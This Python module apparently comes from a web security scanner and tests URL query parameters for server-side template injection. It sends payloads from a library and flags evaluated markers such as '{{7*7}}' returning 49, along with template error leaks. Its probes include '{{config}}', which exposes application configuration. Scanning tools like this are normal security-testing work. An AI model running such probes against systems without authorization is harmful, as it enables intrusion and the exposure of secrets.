"""ssti — server-side template injection scanner from payloads base"""
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.http import HttpClient
from core.payloads import get

# payload -> expected eval result
EXPECT = [
    ("{{7*7}}", "49"), ("{{7*'7'}}", "7777777"), ("${7*7}", "49"),
    ("#{7*7}", "49"), ("<%= 7*7 %>", "49"), ("${{7*7}}", "49"),
    ("{{config}}", "SECRET"), ("{{self}}", "TemplateReference"),
    ("[[${7*7}]]", "49"),
]

class Ssti:
    def run(self, session, logger):
        target = session.target
        http = HttpClient(session, logger)
        u = urlparse(target)
        params = parse_qs(u.query) or {"name": ["test"]}

        payloads = get("ssti", limit=80, mutate_by=0)
        print(f"[ssti] {len(payloads)} payloads on {list(params.keys())}")
        findings = []

        for name in params:
            for p in payloads:
                q = dict(params); q[name] = [p]
                url = urlunparse(u._replace(query=urlencode(q, doseq=True)))
                r = http.get(url)
                if not r: continue
                body = r.text
                # check known eval markers
                for test, expected in EXPECT:
                    if p == test and expected in body and test not in body:
                        findings.append({"param":name,"payload":p,"result":expected,"type":"math"})
                        print(f"  [!] SSTI: {name}={p} -> {expected}")
                        logger.finding("ssti","critical",f"{name}={p}")
                        break
                # generic error hints
                if "TemplateSyntaxError" in body or "jinja2.exceptions" in body:
                    findings.append({"param":name,"payload":p,"type":"error_leak"})
                    print(f"  [!] SSTI error leak: {p[:40]}")
                    logger.finding("ssti_error","high",f"{name} {p[:60]}")
                if len(findings) > 20: break
            if findings: break

        print(f"[ssti] done: {len(findings)}")
        return {"findings": findings}
